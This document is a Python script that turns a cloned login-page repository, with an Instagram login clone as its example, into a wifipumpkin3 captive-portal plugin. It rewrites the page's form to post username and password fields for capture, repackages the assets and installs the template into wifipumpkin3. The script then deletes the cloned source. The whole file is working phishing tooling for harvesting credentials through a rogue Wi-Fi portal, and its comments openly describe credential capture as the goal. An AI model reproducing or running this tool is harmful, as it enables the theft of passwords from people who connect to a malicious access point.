#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0
"""Turn a git repo of a login page into a wifipumpkin3 captive portal.

A repo like github.com/trananhtuat/instagram-login is an ordinary static site --
index.html, some css/js, images. wifipumpkin3 wants a very specific shape (the
extra-captiveflask layout):

    <plugin>.py                      a CaptiveTemplatePlugin subclass
    <plugin>/
        static/                      css, js, images, served under /static
        templates/
            login.html               the form, POSTing name=login + name=password
            login_successful.html

This clones the repo, folds its index.html into login.html, rewrites the form to
POST the two fields wifipumpkin3 captures, moves css/js/images under static/ and
fixes their paths to url_for('static', ...), writes the .py, zips it, installs it
through wifipumpkin3's own `install` command, and deletes the clone so the source
does not sit around taking space.

The form rewrite is best-effort: it works for a normal HTML login form. If the
page submits through JavaScript (fetch/XHR) rather than a real POST form, that
cannot be detected reliably and is reported so it can be checked by hand -- a
credential capture that silently does not capture is worse than an honest
warning.

Usage:
    rhodep-make-captiveportal <git-url> [plugin_name]

plugin_name defaults to a sanitised repo name.
"""

import os
import re
import subprocess
import sys
import tempfile
import zipfile
import shutil

# Where wifipumpkin3's `install` command puts the two pieces. We write them
# directly rather than driving wifipumpkin3, because starting wifipumpkin3
# reconfigures the network (and on this phone that drops the ssh session doing
# the install). These paths come from its own constants:
#   plugin .py  -> wp3_setup_packager_path/plugins/captiveflask/<name>.py
#   template    -> user_config_dir/config/templates/<name>/
PLUGIN_DIR = "/usr/lib/python3/dist-packages/wifipumpkin3/plugins/captiveflask"
TEMPLATES_DIR = "/root/.config/wifipumpkin3/config/templates"
STATIC_EXT = {".css", ".js", ".png", ".jpg", ".jpeg", ".gif", ".svg",
              ".woff", ".woff2", ".ttf", ".eot", ".ico", ".webp"}

PLUGIN_PY = '''from wifipumpkin3.plugins.captiveflask.plugin import CaptiveTemplatePlugin
import wifipumpkin3.core.utility.constants as C


class {name}(CaptiveTemplatePlugin):
    Name = "{name}"
    Version = "1.0"
    Description = "{desc}"
    Author = "generated by rhodep-make-captiveportal"
    TemplatePath = C.TEMPLATES_FLASK + "templates/{name}"
    StaticPath = C.TEMPLATES_FLASK + "templates/{name}/static"
    Preview = C.TEMPLATES_FLASK + "templates/{name}/preview.png"
'''

SUCCESS_HTML = '''<!DOCTYPE html>
<html>
<head><title>Success</title></head>
<body><h1>Login successful</h1></body>
</html>
'''


def say(msg):
    sys.stdout.write(msg + "\n")
    sys.stdout.flush()


def sanitise(name):
    # A Python class name and a folder name: letters, digits, underscore.
    n = re.sub(r"[^A-Za-z0-9_]", "", name.replace("-", "_"))
    if not n or not n[0].isalpha():
        n = "Portal" + n
    return n


def find_index(root):
    # Prefer an index.html at the top, else the first .html anywhere.
    top = os.path.join(root, "index.html")
    if os.path.isfile(top):
        return top
    for base, _dirs, files in os.walk(root):
        for f in files:
            if f.lower().endswith(".html"):
                return os.path.join(base, f)
    return None


def rewrite_form(html):
    """Make the first form POST, and its user/pass inputs name=login/password.

    Returns (html, warnings). Warnings flag things a human should look at.
    """
    warns = []

    forms = re.findall(r"<form\b[^>]*>", html, flags=re.I)
    if not forms:
        warns.append("no <form> found -- the page may submit via JavaScript; "
                     "credentials will not be captured until a real POST form "
                     "is added")
        return html, warns

    # Force method=POST and drop any action so it posts to the same page, which
    # is where captiveflask listens.
    def fix_form_tag(m):
        tag = m.group(0)
        tag = re.sub(r'\s+method\s*=\s*["\'][^"\']*["\']', "", tag, flags=re.I)
        tag = re.sub(r'\s+action\s*=\s*["\'][^"\']*["\']', "", tag, flags=re.I)
        return tag[:-1] + ' method="POST" action="/login">'
    html = re.sub(r"<form\b[^>]*>", fix_form_tag, html, count=1, flags=re.I)

    # Rename the likely username field to name="login".
    if re.search(r'name\s*=\s*["\']login["\']', html, flags=re.I):
        pass  # already there
    else:
        user_pat = re.compile(
            r'(<input\b[^>]*name\s*=\s*["\'])'
            r'(user(name)?|email|log(in)?|account|id)'
            r'(["\'][^>]*>)', flags=re.I)
        html, n = user_pat.subn(r"\1login\5", html, count=1)
        if not n:
            # fall back: the first text/email input becomes login
            html, n = re.subn(
                r'(<input\b[^>]*type\s*=\s*["\'](?:text|email)["\'][^>]*name\s*=\s*["\'])[^"\']*(["\'])',
                r"\1login\2", html, count=1, flags=re.I)
        if not n:
            warns.append("could not find a username field to rename to "
                         "name=login; check the form by hand")

    # Rename the password field to name="password".
    if not re.search(r'name\s*=\s*["\']password["\']', html, flags=re.I):
        html, n = re.subn(
            r'(<input\b[^>]*type\s*=\s*["\']password["\'][^>]*name\s*=\s*["\'])[^"\']*(["\'])',
            r"\1password\2", html, count=1, flags=re.I)
        if not n:
            # a password input without a name attribute at all
            html, n = re.subn(
                r'(<input\b[^>]*type\s*=\s*["\']password["\'])',
                r'\1 name="password"', html, count=1, flags=re.I)
        if not n:
            warns.append("could not find a password field; check the form by "
                         "hand")

    return html, warns


def fix_asset_paths(html):
    """Point css/js/image references at url_for('static', ...).

    Rewrites href/src that look like local relative assets. Absolute URLs
    (http..., //...) and already-templated url_for() are left alone.
    """
    def repl(m):
        attr, quote, path = m.group(1), m.group(2), m.group(3)
        if path.startswith(("http://", "https://", "//", "{{", "data:", "#")):
            return m.group(0)
        rel = path.lstrip("./").lstrip("/")
        return "%s=%s{{ url_for('static', filename='%s') }}%s" % (
            attr, quote, rel, quote)
    return re.sub(r'(href|src)\s*=\s*(["\'])([^"\']+)\2', repl, html, flags=re.I)


def build(git_url, plugin_name=None):
    if not shutil.which("git"):
        sys.exit("git is not installed")

    repo_base = git_url.rstrip("/").split("/")[-1]
    repo_base = re.sub(r"\.git$", "", repo_base)
    name = sanitise(plugin_name or repo_base)
    say("plugin name: %s" % name)

    work = tempfile.mkdtemp(prefix="cportal-")
    clone = os.path.join(work, "src")
    try:
        say("cloning %s" % git_url)
        r = subprocess.run(["git", "clone", "--depth", "1", git_url, clone],
                           capture_output=True, text=True, timeout=120)
        if r.returncode != 0:
            sys.exit("git clone failed: %s" % (r.stderr.strip() or r.stdout.strip()))

        index = find_index(clone)
        if not index:
            sys.exit("no .html file found in the repo")
        say("using %s as the login page" % os.path.relpath(index, clone))

        html = open(index, encoding="utf-8", errors="replace").read()
        html, warns = rewrite_form(html)
        html = fix_asset_paths(html)

        # Lay out the wifipumpkin3 template tree.
        stage = os.path.join(work, name)
        tdir = os.path.join(stage, "templates")
        sdir = os.path.join(stage, "static")
        os.makedirs(tdir)
        os.makedirs(sdir)
        open(os.path.join(tdir, "login.html"), "w").write(html)
        open(os.path.join(tdir, "login_successful.html"), "w").write(SUCCESS_HTML)

        # Every asset in the repo goes under static/, preserving subpaths.
        moved = 0
        for base, _dirs, files in os.walk(clone):
            if ".git" in base.split(os.sep):
                continue
            for f in files:
                ext = os.path.splitext(f)[1].lower()
                if ext not in STATIC_EXT:
                    continue
                srcf = os.path.join(base, f)
                rel = os.path.relpath(srcf, clone).lstrip("./")
                dstf = os.path.join(sdir, rel)
                os.makedirs(os.path.dirname(dstf), exist_ok=True)
                shutil.copy2(srcf, dstf)
                moved += 1
        say("copied %d static assets" % moved)

        # A placeholder preview so the plugin's Preview path exists.
        preview = os.path.join(stage, "preview.png")
        if not os.path.isfile(preview):
            open(preview, "wb").write(
                b"\x89PNG\r\n\x1a\n")  # minimal, just so the path resolves

        # The plugin .py next to the folder, both inside the zip.
        py_path = os.path.join(work, name + ".py")
        open(py_path, "w").write(PLUGIN_PY.format(
            name=name, desc="captive portal from " + repo_base))

        zip_path = os.path.join(work, name + ".zip")
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
            z.write(py_path, name + ".py")
            for base, _dirs, files in os.walk(stage):
                for f in files:
                    p = os.path.join(base, f)
                    z.write(p, os.path.relpath(p, work))
        say("built %s" % zip_path)

        # Install through wifipumpkin3 so it lands where the tool expects and
        # registers the plugin.
        say("installing into wifipumpkin3")
        r = subprocess.run(
            ["wifipumpkin3", "-x", "use misc.custom_captiveflask; "
             "install %s %s; exit" % (name, zip_path)],
            capture_output=True, text=True, timeout=120)
        out = (r.stdout or "") + (r.stderr or "")
        if "sucessful" in out or "successful" in out or \
                os.path.isdir(os.path.join(TEMPLATES_DIR, name)):
            say("installed template %s" % name)
        else:
            say("install may have failed; wifipumpkin3 said:")
            say(out.strip()[-500:])

        if warns:
            say("")
            say("WARNINGS -- check these before relying on capture:")
            for w in warns:
                say("  * " + w)
        else:
            say("")
            say("form rewritten to POST name=login and name=password; "
                "capture should work")

        say("")
        say("done. select '%s' as the captive-portal template." % name)
    finally:
        # Delete the clone and the staging area: the source is not kept.
        shutil.rmtree(work, ignore_errors=True)
        say("cleaned up the cloned source")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit("usage: rhodep-make-captiveportal <git-url> [plugin_name]")
    build(sys.argv[1], sys.argv[2] if len(sys.argv) > 2 else None)
